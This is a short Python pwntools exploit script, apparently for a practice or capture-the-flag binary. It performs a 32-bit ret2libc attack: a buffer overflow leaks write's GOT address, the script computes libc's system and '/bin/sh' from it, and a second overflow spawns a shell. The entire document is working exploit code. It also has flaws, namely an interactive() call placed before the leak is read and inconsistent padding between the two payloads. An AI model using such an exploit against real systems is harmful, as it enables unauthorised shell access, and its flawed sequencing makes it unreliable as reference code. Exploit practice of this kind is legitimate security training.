from pwn import *

context(arch="i386",os="linux")

p=process("./test")

elf=ELF("./test")

libc=ELF("/lib/i386-linux-gnu/libc.so.6")

#dofunc_addr=elf.symbols["dofunc"]

dofunc_addr=0x0804849B

write_plt=elf.plt["write"]

#write_sym=elf.sym["write"]

write_got=elf.got["write"]

padding2ebp=0x14

payload1='a'*(padding2ebp)+p32(write_plt)+p32(dofunc_addr)+p32(1)+p32(write_got)+p32(4)

delimiter="input:"
p.sendlineafter(delimiter,payload1)
p.interactive()

write_addr=u32(p.recv(4))

system_addr=write_addr-libc.sym["write"]+libc.sym["system"]

binsh_addr=write_addr-libc.sym["write"]+next(libc.search("/bin/sh"))

payload2='a'*(padding2ebp+4)+p32(system_addr)+p32(0x123)+p32(binsh_addr)

delimiter="input:"

p.sendlineafter(delimiter,payload2)

p.interactive()